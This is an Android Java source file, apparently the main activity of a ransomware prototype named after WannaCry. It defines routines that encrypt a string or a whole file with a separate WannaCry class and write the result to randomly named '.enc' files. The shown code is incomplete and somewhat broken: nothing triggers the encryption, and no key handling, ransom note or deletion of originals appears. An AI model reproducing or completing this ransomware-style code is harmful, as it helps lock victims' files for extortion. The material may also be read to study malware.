package com.android.wannacry;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.NoSuchAlgorithmException;
import java.util.Locale;
import java.util.Random;

import javax.crypto.Cipher;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class MainActivity extends AppCompatActivity {

    private WannaCry wannaCry = null;
    public static final String upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    public static final String lower = upper.toLowerCase(Locale.ROOT);
    public static final String digits = "0123456789";
    public static final String alphanum = upper + lower + digits;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        wannaCry = new WannaCry();

        File filesDir = getFilesDir();
    }

    protected void encrypt_string(String string) {

        byte[] encrytped_string = null;
        try {
            encrytped_string=wannaCry.encrypt(string);
        } catch (Exception e) {
            e.printStackTrace();
        }

        String filename = "myfile";
        FileOutputStream outputStream;

        try {
            outputStream = openFileOutput(filename, this.getBaseContext().MODE_PRIVATE);
            outputStream.write(encrytped_string);
            outputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    protected void encrypt_file(File file_to_encrypt) {
        try {
            byte[] outputBytes = null;
            byte[] b = new byte[8];
            System.out.println(file_to_encrypt.toString());
            FileInputStream filename = new FileInputStream(file_to_encrypt);
            byte[] inputBytes = new byte[(int) file_to_encrypt.length()];
            int a = filename.read(inputBytes);
            FileOutputStream outputStream = new FileOutputStream(getFilesDir()+"/"+randomString()+".enc");
            while ( a != -1 ) {
                System.out.println("encrypting");
                a = filename.read(inputBytes);
                outputBytes = wannaCry.encrypt_byte(inputBytes);
                outputStream.write(outputBytes);
            }
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public String randomString() {
        char[] buf = new char[8];
        Random rand = new Random();
        for (int i = 0; i < 8; i++)
            buf[i]=alphanum.charAt(rand.nextInt(alphanum.length()-1));
        return new String(buf);
    }
}
